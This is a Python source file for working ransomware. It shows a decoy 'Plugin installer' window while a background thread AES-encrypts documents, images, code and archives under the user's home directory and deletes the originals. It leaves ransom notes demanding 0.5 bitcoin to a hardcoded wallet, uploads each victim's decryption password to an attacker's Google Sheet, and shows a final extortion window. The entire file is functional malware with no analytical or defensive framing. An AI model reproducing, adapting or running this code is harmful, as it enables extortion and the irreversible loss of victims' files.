import random
import string
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
import threading
import os
import sys
from PyQt5.QtGui import QFont, QPixmap, QImage
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QLabel, QLineEdit, QMessageBox
from PyQt5.QtCore import pyqtSlot, Qt
import gspread
from oauth2client.service_account import ServiceAccountCredentials
from pyasn1.compat.octets import null
from urllib.request import urlopen


# this function encrypts a single file
def encrypt_file(key, filename, filepath):
    dirpath = os.path.dirname(filepath)
    filesize = str(os.path.getsize(filepath)).zfill(16)
    iv = Random.new().read(16)  # Contains the initial value which will be used to start a cipher feedback mode

    aes_obj = AES.new(key, AES.MODE_CBC, iv)

    with open(filepath, 'rb') as infile:  # opens the file
        with open(os.path.join(dirpath, "༼◕_◕༽ " + filename), 'wb') as outfile:  # set the output file with a different name
            outfile.write(filesize.encode('utf-8'))
            outfile.write(iv)

            while True:  # write the file with chunk of 64 * 1024 and encrypt it
                chunk = infile.read(64 * 1024)
                if len(chunk) == 0:  # if true then done reading
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))  # fill the chunk to 16 if not length of 16

                outfile.write(aes_obj.encrypt(chunk))  # the encryption occures here


# this function decrypts a single file
def decrypt_file(key, filename, filepath):
    dirpath = os.path.dirname(filepath)

    with open(filepath, 'rb') as infile:  # opens the file
        filesize = int(infile.read(16))  # gets the filesize from start of file
        iv = infile.read(16)  # gets the iv from the file

        aes_obj = AES.new(key, AES.MODE_CBC, iv)

        with open(os.path.join(dirpath, filename[6:]), 'wb') as outfile:  # writes the file without the first 6 chars
            while True:
                chunk = infile.read(64 * 1024)
                if len(chunk) == 0:  # the file is in chunks of 16 so when == 0, break
                    break

                outfile.write(aes_obj.decrypt(chunk))
            outfile.truncate(filesize)  # truncate the file after loop


# this is the run function of the daemon thread, it iterates all the files in system and encryptes specific ones
def encrypt_all_files():
    # encrypt all files with following types
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))  # generate random password
    ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
    for root, dirs, files in os.walk(os.getenv("HOME")):  # iterate from home
        for filename in files:
            if filename.endswith(ext) and not filename.startswith("༼◕_◕༽"):  # pick only certain files and not enc ones
                try:
                    key = SHA256.new(password.encode('utf-8')).digest()  # generates a 256bit key from password
                    filepath = os.path.abspath(os.path.join(root, filename))
                    encrypt_file(key, filename, filepath)  # calls the encrypt function
                    os.remove(filepath)  # deletes the file
                except:
                    pass

    # create txt file with ransom info
    global random_username
    message = "your file have been encrypted, to get them back transfer 0.5 bitcoins to our bitwallet address along with your unique id\n"
    bitwallet = "1HB5XMLmzFVj8ALj6mfBsbifRoD4miY36v"
    fullmessage = message + "\nbitwallet address: " + bitwallet + "\nyour unique username: " + random_username
    with open(os.path.join(os.getenv("HOME") + "/Desktop", "Read me to get your files back!.txt"), 'w') as outfile:  # writes the file
        outfile.write(fullmessage)
    with open(os.path.join(os.getenv("HOME") + "/Documents", "Read me to get your files back!.txt"), 'w') as outfile:  # writes the file
        outfile.write(fullmessage)
    with open(os.path.join(os.getenv("HOME") + "/Downloads", "Read me to get your files back!.txt"), 'w') as outfile:  # writes the file
        outfile.write(fullmessage)
    with open(os.path.join(os.getenv("HOME") + "/", "username.txt"), 'w') as outfile:  # writes the file
        outfile.write(random_username)

    # use creds to interact with the Google Drive API - write username and password to sheet (for the attacker)
    scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
    creds = ServiceAccountCredentials.from_json_keyfile_name('googlesheet.json', scope)  # connect to json file
    client = gspread.authorize(creds)
    sheet = client.open("Crypy db").sheet1  # open the sheet
    row = [random_username, password]  # put information: username and password
    index = sheet.row_count  # put in last row and create new for next time
    sheet.insert_row(row, index)  # insert to db


# decrypts all files when user gives correct password code, if not then the files are lost forever
def decrypt_all_files(code):
    for root, dirs, files in os.walk(os.getenv("HOME")):  # iterate from home
        for filename in files:
            if filename.lower().startswith("༼◕_◕༽ "):  # checks if the file contains the encrypted symbol
                try:
                    filepath = os.path.abspath(os.path.join(root, filename))
                    key = SHA256.new(code.encode('utf-8')).digest()  # generates the key from the password
                    decrypt_file(key, filename, filepath)  # decrypts the file
                    os.remove(filepath)  # remove the encrypted file
                except:
                    pass
    filepath = os.path.join(os.getenv("HOME") + "/", "username.txt")
    if os.path.exists(filepath):
        os.remove(filepath)  # remove id file if exists


# GUI class 1
class App(QWidget):

    def __init__(self):
        # init for the gui
        super().__init__()
        self.title = 'Plugin installer'
        self.left = 600
        self.top = 200
        self.width = 640
        self.height = 480
        self.initui()

    def initui(self):
        self.setWindowTitle(self.title)
        self.setGeometry(self.left, self.top, self.width, self.height)

        # make a background picture
        label = QLabel(self)
        iurl = "https://i.imgur.com/BUimYNu.jpg"
        iurl = urlopen(iurl).read()
        image = QImage()
        image.loadFromData(iurl)
        pixmap = QPixmap(image)
        label.setPixmap(pixmap)

        # make the label
        label2 = QLabel("Click to install the required plugin:", self)
        label2.move(67, 120)
        font = QFont()
        font.setBold(1)
        font.setUnderline(1)
        font.setPointSize(23)
        label2.setFont(font)

        # make the install button
        button = QPushButton('Install', self)
        button.move(245, 240)
        button.resize(150, 80)
        font2 = QFont()
        font2.setPointSize(15)
        button.setFont(font2)
        button.clicked.connect(self.on_click1)

        self.show()

    @pyqtSlot()
    def on_click1(self):
        self.close()  # move to next gui window


# GUI class 2
class App2(QWidget):
    line3 = null

    def __init__(self):
        # init for the gui
        super().__init__()
        self.title = 'Don\'t quit me!'
        self.left = 600
        self.top = 200
        self.width = 640
        self.height = 480
        self.initui()

    def initui(self):
        # set black background and fix window size
        self.setWindowTitle(self.title)
        self.setGeometry(self.left, self.top, self.width, self.height)
        self.setAutoFillBackground(True)
        p = self.palette()
        p.setColor(self.backgroundRole(), Qt.black)
        self.setPalette(p)

        # make the explanation label
        label = QLabel("Your file have been encrypted! \nThey are encrypted with AES, SHA256 hash \nThat means impossible to decrypt without the password! \nTo get them back transfer 0.5 bitcoins to our bitwallet address: \n\nProvide your unique id as well (so we know you paid) \nDo not quit this window!!! \n\nYour unique user name: \n\n\n\nEnter the password once we have emailed it to you:", self)
        font = QFont()
        font.setBold(1)
        font.setPointSize(16)
        label.setFont(font)
        label.setStyleSheet('color: white')

        # make the bitcoin wallet textbox
        line = QLineEdit(self)
        line.move(0, 99)
        line.setText("1HB5XMLmzFVj8ALj6mfBsbifRoD4miY36v")
        line.setFixedSize(300, 22)
        line.setReadOnly(1)

        # make the username textbox
        line2 = QLineEdit(self)
        line2.move(0, 225)
        line2.setText(random_username)
        line2.setFixedSize(550, 30)
        line2.setReadOnly(1)

        # make the password textbox
        global line3
        line3 = QLineEdit(self)
        line3.move(0, 325)
        line3.setFixedSize(550, 30)

        # make the button to get the files decrypted
        button = QPushButton('Get your files back...', self)
        button.move(180, 390)
        button.resize(220, 50)
        font2 = QFont()
        font2.setPointSize(15)
        font2.setBold(1)
        button.setFont(font2)
        button.clicked.connect(self.on_click1)

        self.show()

    @pyqtSlot()
    def on_click1(self):
        # on click verify the information is correct
        global line3
        buttonreply = QMessageBox.question(self, '', "Is the password correct!?", QMessageBox.No | QMessageBox.Yes, QMessageBox.No)
        if buttonreply == QMessageBox.Yes:
            decrypt_all_files(line3.text())  # submit the password to the decrypting function
            self.close()


#                               ###################### main ######################
random_username = ""
flag = 0
filepath = os.path.join(os.getenv("HOME") + "/", "username.txt")

if os.path.exists(filepath):  # check if computer has already been encrypted
    with open(filepath, 'rb') as infile:  # opens the file
        random_username2 = str(infile.read())  # use current username
        random_username = random_username2[2:-1]
else:  # first time run
    flag = 1
    print("installing, please wait")
    random_username = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))  # generates a random username

    t1 = threading.Thread(target=encrypt_all_files)  # daemon thread runs the encrypt_all_files() function in background
    t1.daemon = True  # make the thread run in bg
    t1.start()  # start the encrypting thread

    # show decoy window
    app = QApplication(sys.argv)
    ex = App()
    ap = app.exec_()

if flag == 1:
    t1.join()  # wait for thread to finish encrypting

# after all the files have been encrypted, show hijack message window
app2 = QApplication(sys.argv)
ex2 = App2()
ap2 = app2.exec_()
